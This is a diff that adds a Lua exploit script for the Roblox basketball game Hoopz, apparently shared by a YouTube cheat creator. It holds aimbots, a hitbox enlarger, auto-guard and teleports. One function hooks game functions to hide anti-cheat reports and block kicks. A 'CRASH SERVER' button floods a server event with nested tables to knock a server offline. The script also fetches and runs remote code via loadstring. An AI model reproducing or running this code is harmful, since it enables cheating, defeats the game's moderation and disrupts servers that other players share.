@@ -1,0 +1,768 @@
+-- Fix 404
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+local Config = {
+    WindowName = "Hoopz By Legend Handles On Youtube!",
+    Color = Color3.fromRGB(182,41,243),
+    Keybind = Enum.KeyCode.RightBracket
+}
+
+
+
+local Library = loadstring(game:HttpGet("https://raw.githubusercontent.com/AlexR32/Roblox/main/BracketV3.lua"))()
+local Window = Library:CreateWindow(Config, game:GetService("CoreGui"))
+
+local Tab1 = Window:CreateTab("Hoopz By Legend HandlesYT")
+
+
+local Section1 = Tab1:CreateSection("Main")
+local Section2 = Tab1:CreateSection("Player")
+
+local Button3 = Section1:CreateButton("Aimbot v1", function()
+local Camera = workspace.CurrentCamera
+Holding = false
+function findNets()
+    for i, v in pairs(workspace:GetDescendants()) do
+        if v.Name == "Net" then
+            v.Parent = workspace
+        end
+    end
+end
+local function findClosestPart(position)
+    local closestPart, closestPartMagnitude
+    local tmpMagnitude
+    for i, v in pairs(workspace:GetChildren()) do
+        if v.Name == "Net" then
+            if closestPart then
+                tmpMagnitude = (position - v.Position).magnitude
+                if tmpMagnitude < closestPartMagnitude then
+                    closestPart = v
+                    closestPartMagnitude = tmpMagnitude
+                end
+            else
+                closestPart = v
+                closestPartMagnitude = (position - v.Position).magnitude
+            end
+        end
+    end
+    return closestPart
+end
+findNets()
+local UIS = game:GetService('UserInputService')
+UIS.InputBegan:connect(function(Input, GPE)
+    if not GPE and Input.KeyCode == Enum.KeyCode.X then
+        local lookthat = findClosestPart(game.Players.LocalPlayer.Character.Torso.Position)
+        Holding = true
+        repeat
+            wait()
+        Camera.CFrame = CFrame.new(Camera.CFrame.p, lookthat.Position + Vector3.new(0, 90, 0)) 
+        until Holding == false
+    end
+end)
+
+UIS.InputEnded:connect(function(Input, GPE)
+    if not GPE and Input.KeyCode == Enum.KeyCode.X then
+        Holding = false
+    end
+end)
+
+local CoreGui = game:GetService("StarterGui") -- Variable of StarterGui
+
+CoreGui:SetCore("SendNotification", {
+    -- Customizable
+    Title = "USE 85 POWER FOR 75",
+    Text = "HOLD X TO LOCK",
+    Duration = 2, -- Set the duration to how much you want this to stay
+    -- More code in part 2
+})
+end) 
+
+local Button3 = Section1:CreateButton("Aimbot v2", function()
+local Camera = workspace.CurrentCamera
+Holding = false
+function findNets()
+    for i, v in pairs(workspace:GetDescendants()) do
+        if v.Name == "Net" then
+            v.Parent = workspace
+        end
+    end
+end
+local function findClosestPart(position)
+    local closestPart, closestPartMagnitude
+    local tmpMagnitude
+    for i, v in pairs(workspace:GetChildren()) do
+        if v.Name == "Net" then
+            if closestPart then
+                tmpMagnitude = (position - v.Position).magnitude
+                if tmpMagnitude < closestPartMagnitude then
+                    closestPart = v
+                    closestPartMagnitude = tmpMagnitude
+                end
+            else
+                closestPart = v
+                closestPartMagnitude = (position - v.Position).magnitude
+            end
+        end
+    end
+    return closestPart
+end
+findNets()
+local UIS = game:GetService('UserInputService')
+UIS.InputBegan:connect(function(Input, GPE)
+    if not GPE and Input.KeyCode == Enum.KeyCode.Y then
+        local lookthat = findClosestPart(game.Players.LocalPlayer.Character.Torso.Position)
+        Holding = true
+        repeat
+            wait()
+        Camera.CFrame = CFrame.new(Camera.CFrame.p, lookthat.Position + Vector3.new(0, 50, 0)) 
+        until Holding == false
+    end
+end)
+
+UIS.InputEnded:connect(function(Input, GPE)
+    if not GPE and Input.KeyCode == Enum.KeyCode.Y then
+        Holding = false
+    end
+end)
+
+local CoreGui = game:GetService("StarterGui") -- Variable of StarterGui
+
+CoreGui:SetCore("SendNotification", {
+    -- Customizable
+    Title = "USE 85 POWER FOR 85",
+    Text = "HOLD Y TO LOCK",
+    Duration = 2, -- Set the duration to how much you want this to stay
+    -- More code in part 2
+})
+end) 
+
+local Button3 = Section1:CreateButton("Ball Mag/Hitbox", function()
+    if not getgenv().MTAPIMutex then loadstring(game:HttpGet("https://raw.githubusercontent.com/KikoTheDon/MT-Api-v2/main/__source/mt-api%20v2.lua", true))() end
+local plr = game.Players.LocalPlayer
+local hook = nil
+local enabled = false
+
+plr.Character["Torso"]:AddPropertyEmulator("Size") -- fake size
+plr.Character["Torso"]:AddPropertyEmulator("Size") -- fake size
+
+
+        plr.Character["Torso"]:AddPropertyEmulator("Size") -- fake size
+        plr.Character["Torso"]:AddPropertyEmulator("Size") -- fake size
+        
+        for i,v in pairs(getconnections(plr.Character["Torso"]:GetPropertyChangedSignal("Size"))) do
+            v.Function = error
+            v:Disable() -- disable property changed
+        end
+        for i,v in pairs(getconnections(plr.Character["Torso"]:GetPropertyChangedSignal("Size"))) do
+            v.Function = error
+            v:Disable() -- disable property changed
+        end
+
+        plr.Character["Torso"].Size = Vector3.new(7, 5, 2.5)
+        plr.Character["Torso"].Size = Vector3.new(7, 5, 2.5)
+        plr.Character["Torso"].Transparency = 1
+        plr.Character["HumanoidRootPart"].Transparency = 0
+        plr.Character["HumanoidRootPart"].Color = Color3.fromRGB(0, 255, 0)
+        plr.Character["HumanoidRootPart"].Material = "Neon"
+        plr.Character["Torso"].Massless = true
+        plr.Character["Torso"].Massless = true
+        enabled = true
+end) 
+
+local Slider1 = Section1:CreateSlider("Ball Mag/Hitbox Range", 0,8,nil,true, function(v)
+local plr = game.Players.LocalPlayer
+local hook = nil
+local enabled = false
+
+plr.Character["Torso"]:AddPropertyEmulator("Size") -- fake size
+plr.Character["Torso"]:AddPropertyEmulator("Size") -- fake size
+
+
+        plr.Character["Torso"]:AddPropertyEmulator("Size") -- fake size
+        plr.Character["Torso"]:AddPropertyEmulator("Size") -- fake size
+        
+        for i,v in pairs(getconnections(plr.Character["Torso"]:GetPropertyChangedSignal("Size"))) do
+            v.Function = error
+            v:Disable() -- disable property changed
+        end
+        for i,v in pairs(getconnections(plr.Character["Torso"]:GetPropertyChangedSignal("Size"))) do
+            v.Function = error
+            v:Disable() -- disable property changed
+        end
+
+        plr.Character["Torso"].Size = Vector3.new((v), 5, 2.5)
+        plr.Character["Torso"].Size = Vector3.new((v), 5, 2.5)
+        plr.Character["Torso"].Transparency = 1
+        plr.Character["HumanoidRootPart"].Transparency = 0
+        plr.Character["HumanoidRootPart"].Color = Color3.fromRGB(0, 255, 0)
+        plr.Character["HumanoidRootPart"].Material = "Neon"
+        plr.Character["Torso"].Massless = true
+        plr.Character["Torso"].Massless = true
+        enabled = true
+        end)
+
+local Button3 = Section1:CreateButton("Auto Handles (OP)", function()
+spawn(function()
+     while true do
+Player = "LocalPlayer" --- you can still put any player name here
+
+AnimationId = "6295643644" --- add ID's from the bottom[/size]
+local Anim = Instance.new("Animation") --- Creates animation[/size]
+Anim.AnimationId = "rbxassetid://"..AnimationId ---- inserts the ID[/size]
+local k = game.Players[Player].Character.Humanoid:LoadAnimation(Anim) --- makes the animation a function[/size]
+k:Play() --Play the animation ----- Runs the animation.[/size]
+k:AdjustSpeed(1) --Set '1' to any value you want to adjust the animation speed. I sugge
+    wait(7)   
+     end  
+end)
+     
+ spawn(function()
+     while true do
+Player = "LocalPlayer" --- you can still put any player name here
+
+AnimationId = "6295270470" --- add ID's from the bottom[/size]
+local Anim = Instance.new("Animation") --- Creates animation[/size]
+Anim.AnimationId = "rbxassetid://"..AnimationId ---- inserts the ID[/size]
+local k = game.Players[Player].Character.Humanoid:LoadAnimation(Anim) --- makes the animation a function[/size]
+k:Play() --Play the animation ----- Runs the animation.[/size]
+k:AdjustSpeed(1) --Set '1' to any value you want to adjust the animation speed. I sugge
+    wait(3)   
+     end
+end)
+
+ spawn(function()
+  while true do
+Player = "LocalPlayer" --- you can still put any player name here
+
+AnimationId = "6295428807" --- add ID's from the bottom[/size]
+local Anim = Instance.new("Animation") --- Creates animation[/size]
+Anim.AnimationId = "rbxassetid://"..AnimationId ---- inserts the ID[/size]
+local k = game.Players[Player].Character.Humanoid:LoadAnimation(Anim) --- makes the animation a function[/size]
+k:Play() --Play the animation ----- Runs the animation.[/size]
+k:AdjustSpeed(1) --Set '1' to any value you want to adjust the animation speed. I sugge
+    wait(5)   
+  end
+end)
+end)
+
+local Button3 = Section1:CreateButton("Auto Guard (Z)", function()
+local tr = false
+local Mouse = game.Players.LocalPlayer:GetMouse()
+
+game:GetService("UserInputService").InputBegan:Connect(function(key, gpe)
+   if key.KeyCode == Enum.KeyCode.Z and not gpe and tr == false then
+           tr = true
+           for i, v in pairs(game.Players:GetPlayers()) do
+               local char = game.Players.LocalPlayer.Character
+               if v.Name ~= char.Name and (v.Character.Torso.CFrame.p - char.Torso.CFrame.p).Magnitude < 25 then
+                   while tr == true do
+                       if v.Character.Torso.Velocity.magnitude > 0.5 and v.Character:FindFirstChild("Basketball") then
+                           char.Humanoid:MoveTo(v.Character.Torso.CFrame.p + v.Character.Torso.Velocity.unit * 7)
+                       elseif v.Character.Torso.Velocity.magnitude < 0.5 and v.Character:FindFirstChild("Basketball") then
+                           char.Humanoid:MoveTo(v.Character.Torso.CFrame.p)
+                       elseif not v.Character:FindFirstChild("Basketball") then
+                           tr = false
+                       end
+                        task.wait()
+                   end
+               end
+           end
+       elseif key.KeyCode == Enum.KeyCode.Z and not gpe and tr == true then
+           tr = false
+       end
+   end
+)
+end)
+
+
+local Toggle5 = Section1:CreateToggle("Remove Anti Cheat Logs", nil,function(State)
+local plr = game.Players.LocalPlayer
+local remote = game.ReplicatedStorage:WaitForChild("sbEvent")
+
+local old
+old = hookfunction(coroutine.wrap, function(f)
+   local upval = getupvalues(f)[1]
+   if islclosure(f) and upval and typeof(upval) == "Instance" and upval.ClassName == "RemoteEvent" then
+       local consts = getconstants(f)
+       warn("possible detection call #1:", unpack(consts))
+       return wait(9e9)
+   end
+   return old(f)
+end)
+
+local old
+old = hookmetamethod(game, "__namecall", function(self, ...)
+   local method = getnamecallmethod()
+   if self == remote and method == "FireServer" then
+       local args = {...}
+       if #args > 1 or not game:IsAncestorOf(getcallingscript()) then
+           warn("possible detection call #2:", ...)
+           if debug.validlevel(4) then
+               return wait(9e9)
+           else
+               return error() --coroutine.wrap used, the only way to abort it from inside is erroring
+           end
+       end
+   elseif self == plr and method == "Kick" then
+       return wait(9e9)
+   end
+   return old(self, ...)
+end)
+end)
+
+
+local Button3 = Section1:CreateButton("(P) CRASH SERVER", function()
+getgenv().Toggled=false
+getgenv().KeyBind="P"
+getgenv().Delay=0.7
+local UIS=game:GetService'UserInputService'
+
+--//main
+
+local function Source()
+game:GetService("NetworkClient"):SetOutgoingKBPSLimit(math.huge)
+local function getmaxvalue(val) 
+   local mainvalueifonetable = 49999
+   if type(val) ~= "number" then
+       return nil 
+   end
+   local calculateperfectval = (mainvalueifonetable/(val+2))
+   return calculateperfectval 
+end
+
+local function bomb(tableincrease, tries) 
+ local maintable = {}
+ local spammedtable = {}
+ 
+ table.insert(spammedtable, {})
+ z = spammedtable[1]
+ 
+ for i = 1, tableincrease do
+    local tableins = {}
+    table.insert(z, tableins)
+    z = tableins
+ end 
+ 
+ local calculatemax = getmaxvalue(tableincrease) 
+ local maximum 
+ 
+ if calculatemax then
+     maximum = calculatemax
+     else
+     maximum = 10000
+ end
+ 
+ for i = 1, maximum do
+     table.insert(maintable, spammedtable)
+ end 
+ 
+  if calculatemax then
+     maximum = calculatemax
+     else
+     maximum = 10000
+ end
+ 
+ for i = 1, maximum do
+     table.insert(maintable, spammedtable)
+ end 
+
+ for i = 1, tries do
+    game.RobloxReplicatedStorage.UpdatePlayerBlockList:FireServer(maintable)
+ end
+end
+
+
+bomb(250, 5) --// change values if client crashes
+end
+UIS.InputBegan:Connect(function(Key)
+    if Key.KeyCode==Enum.KeyCode[getgenv().KeyBind:upper()] and not UIS:GetFocusedTextBox() then
+        if getgenv().Toggled then
+            getgenv().Toggled=false
+            warn'Disabled!'
+        elseif not getgenv().Toggled then
+            getgenv().Toggled=true
+            warn'Enabled!'
+            while getgenv().Toggled do
+                Source()
+                wait(getgenv().Delay)
+            end
+        end
+    end
+end)
+end)
+
+local Button3 = Section1:CreateButton("No Out Of Bounds", function()
+game.Workspace.Courts["Court A"].OOB:Destroy()
+
+game.Workspace.Courts["Court B"].OOB:Destroy()
+
+game.Workspace.Courts["Court C"].OOB:Destroy()
+
+game.Workspace.Courts["Court D"].OOB:Destroy()
+
+game.Workspace.Courts["Court E"].OOB:Destroy()
+
+game.Workspace.Courts["Court F"].OOB:Destroy()
+
+game.Workspace.Courts["Court G"].OOB:Destroy()
+
+game.Workspace.Courts["Court H"].OOB:Destroy()
+
+game.Workspace.Courts["Court I"].OOB:Destroy()
+
+game.Workspace.Courts["Court J"].OOB:Destroy()
+
+game.Workspace.Courts["Court K"].OOB:Destroy()
+end)
+
+
+---------------------------------------------------------------------
+Section1:CreateLabel("Teleport")
+
+local Dropdown2 = Section1:CreateDropdown("Teleport Dropdown", {"Park Courts","City Area","Town Area"}, function(String)
+    locationSelected = String
+end)
+
+local Button1 = Section1:CreateButton("Teleport", function()
+    if locationSelected == "Park Courts" then
+            game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(390.423157, 36.8928337, -735.981567, 1, 0, 0, 0, 1, 0, 0, 0, 1)
+        elseif locationSelected == "City Area" then
+            game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-3.70396256, 56.3978577, -736.212891, 0.0392514132, -1.44766963e-08, 0.999229372, -8.69840875e-08, 1, 1.79047426e-08, -0.999229372, -8.76198456e-08, 0.0392514132)
+        elseif locationSelected == "Town Area" then
+           game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(391.109711, 54.0888519, -381.084381, -0.999807179, -2.02650799e-10, -0.0196368136, -2.10113649e-10, 1, 3.77981091e-10, 0.0196368136, 3.82034154e-10, -0.999807179)
+    end
+end)
+
+Section1:CreateLabel("GUI Made By Legend Handles")
+Section1:CreateLabel("On Youtube Go Sub!")
+
+local Slider1 = Section2:CreateSlider("HipHeight", 0,9.5,nil,true, function(v)
+Float_Height = (v) -- Your float height | 5 is default
+
+local i=1
+G=game;
+_=wait;
+p=G:GetService("Players").LocalPlayer.Character
+p:FindFirstChild("Humanoid").HipHeight = Float_Height
+for i=1,i do
+repeat p:FindFirstChild("Humanoid").HipHeight=Float_Height-n _(t)p:FindFirstChild("Humanoid").HipHeight=Float_Height+n _(t) until
+p:FindFirstChild("Humanoid").Health == 0
+end
+end)
+local Button4 = Section2:CreateButton("Speed Boost (R)", function()
+local mouse = game.Players.LocalPlayer:GetMouse()
+    local parted = false
+
+
+    local part = Instance.new("Part",game.Lighting)
+    part.Anchored = true
+    part.Size = Vector3.new(700,1,700)
+    part.Transparency = 0.9
+    part.TopSurface = "Smooth"
+
+    mouse.KeyDown:connect(function(key)
+        if key == "r" then
+            game.Players.LocalPlayer.Character:SetPrimaryPartCFrame(game.Players.LocalPlayer.Character:GetPrimaryPartCFrame()*CFrame.new(0, 0, -1))
+        end
+    end)
+end)   
+
+local Toggle5 = Section2:CreateToggle("Get All Logos", nil,function(State)
+    if State then
+game.Players.LocalPlayer.Character.HumanoidRootPart.CreatorTag.StaffLabel.Visible = true
+   
+    game.Players.LocalPlayer.Character.HumanoidRootPart.CreatorTag.TwitchLabel.Visible = true
+    
+    game.Players.LocalPlayer.Character.HumanoidRootPart.CreatorTag.YoutubeLabel.Visible = true
+     print("Toggle On")
+     else
+         game.Players.LocalPlayer.Character.HumanoidRootPart.CreatorTag.StaffLabel.Visible = false
+   
+    game.Players.LocalPlayer.Character.HumanoidRootPart.CreatorTag.TwitchLabel.Visible = false
+    
+    game.Players.LocalPlayer.Character.HumanoidRootPart.CreatorTag.YoutubeLabel.Visible = false
+end
+end)
+
+Section2:CreateLabel("Dunk Sets")
+
+local Button5 = Section2:CreateButton("Special Set", function()
+game:GetService("Players").LocalPlayer.Equipping.Dunk.Value = "Dunk_Reverse360BTB2H_Special"
+game:GetService("Players").LocalPlayer.Equipping.Dunk2.Value = "Dunk_LostAndFound_Special"
+game:GetService("Players").LocalPlayer.Equipping.Dunk3.Value = "Dunk_Inverter_Special"
+end)
+local Button5 = Section2:CreateButton("Special Set 2", function()
+game:GetService("Players").LocalPlayer.Equipping.Dunk.Value = "Dunk_FakeBTB_Special"
+game:GetService("Players").LocalPlayer.Equipping.Dunk2.Value = "Dunk_BTLReverse2H_Special"
+game:GetService("Players").LocalPlayer.Equipping.Dunk3.Value = "Dunk_360Windmill_Special"
+end)
+local Button5 = Section2:CreateButton("Legend Set", function()
+game:GetService("Players").LocalPlayer.Equipping.Dunk.Value = "Dunk_360MailMan_L"
+game:GetService("Players").LocalPlayer.Equipping.Dunk2.Value = "Dunk_MJ_L"
+game:GetService("Players").LocalPlayer.Equipping.Dunk3.Value = "Dunk_1HClutchReverse_L"
+end)
+local Button5 = Section2:CreateButton("Epic Set", function()
+game:GetService("Players").LocalPlayer.Equipping.Dunk.Value = "Dunk_CuffCradle_E"
+game:GetService("Players").LocalPlayer.Equipping.Dunk2.Value = "Dunk_VinceCarter360_E"
+game:GetService("Players").LocalPlayer.Equipping.Dunk3.Value = "Dunk_Reverse360BTB_E"
+end)
+local Button5 = Section2:CreateButton("360 Set", function()
+game:GetService("Players").LocalPlayer.Equipping.Dunk.Value = "Dunk_360Pump_E"
+game:GetService("Players").LocalPlayer.Equipping.Dunk2.Value = "Dunk_360_R"
+game:GetService("Players").LocalPlayer.Equipping.Dunk3.Value = "Dunk_360BTL_R"
+end)
+local Button5 = Section2:CreateButton("MJ Set", function()
+game:GetService("Players").LocalPlayer.Equipping.Dunk.Value = "Dunk_MJ_L"
+game:GetService("Players").LocalPlayer.Equipping.Dunk2.Value = "Dunk_MJ_L"
+game:GetService("Players").LocalPlayer.Equipping.Dunk3.Value = "Dunk_MJ_L"
+end)
+
+Section2:CreateLabel("Intros")
+local Button5 = Section2:CreateButton('Smeeze', function()
+game:GetService("Players").LocalPlayer.Equipping.Intro.Value = "Intro_Smeeze_E"
+end)
+local Button5 = Section2:CreateButton('DefaultDance', function()
+game:GetService("Players").LocalPlayer.Equipping.Intro.Value = "Intro_DefaultDance_E"
+end)
+local Button5 = Section2:CreateButton('Slick', function()
+game:GetService("Players").LocalPlayer.Equipping.Intro.Value = "Intro_Slick_E"
+end)
+local Button5 = Section2:CreateButton('MickyJacky', function()
+game:GetService("Players").LocalPlayer.Equipping.Intro.Value = "Intro_MickyJacky_E"
+end)
+local Button5 = Section2:CreateButton('NaeNae', function()
+game:GetService("Players").LocalPlayer.Equipping.Intro.Value = "Intro_NaeNae_L"
+end)
+local Button5 = Section2:CreateButton('Mood', function()
+game:GetService("Players").LocalPlayer.Equipping.Intro.Value = "Intro_Mood_L"
+end)
+local Button5 = Section2:CreateButton('Hiphop', function()
+game:GetService("Players").LocalPlayer.Equipping.Intro.Value = "Intro_Hiphop_L"
+end)
+local Button5 = Section2:CreateButton('AnthonyShuffle', function()
+game:GetService("Players").LocalPlayer.Equipping.Intro.Value = "Intro_AnthonyShuffle_L"
+end)
+local Button5 = Section2:CreateButton('ElectroShuffle', function()
+game:GetService("Players").LocalPlayer.Equipping.Intro.Value = "Intro_ElectroShuffle_L"
+end)
+local Button5 = Section2:CreateButton('Cradles', function()
+game:GetService("Players").LocalPlayer.Equipping.Intro.Value = "Intro_Cradles_L"
+end)
+local Button5 = Section2:CreateButton('Levitate', function()
+game:GetService("Players").LocalPlayer.Equipping.Intro.Value = "Intro_Levitate_L"
+end)
+local Button5 = Section2:CreateButton('Reanimated', function()
+game:GetService("Players").LocalPlayer.Equipping.Intro.Value = "Intro_Reanimated_L"
+end)
+local Button5 = Section2:CreateButton('Sit & Sway', function()
+game:GetService("Players").LocalPlayer.Equipping.Intro.Value = "Intro_Sit&Sway_C"
+end)
+local Button5 = Section2:CreateButton('Swipe', function()
+game:GetService("Players").LocalPlayer.Equipping.Intro.Value = "Intro_Swipe_R"
+end)
+local Button5 = Section2:CreateButton('LDance', function()
+game:GetService("Players").LocalPlayer.Equipping.Intro.Value = "Intro_LDance_U"
+end)
+local Toggle7 = Section1:CreateToggle("UI Toggle", nil, function(State)
+    Window:Toggle(State)
+end)
+
+Toggle7:CreateKeybind(tostring(Config.Keybind):gsub("Enum.KeyCode.", ""), function(Key)
+    Config.Keybind = Enum.KeyCode[Key]
+end)    
+Toggle7:SetState(true)
+
+EquipTool()
+game:GetService("Players").LocalPlayer.CharacterAdded:Connect(function(character)
+    EquipTool()
+end)
+
+--Hi
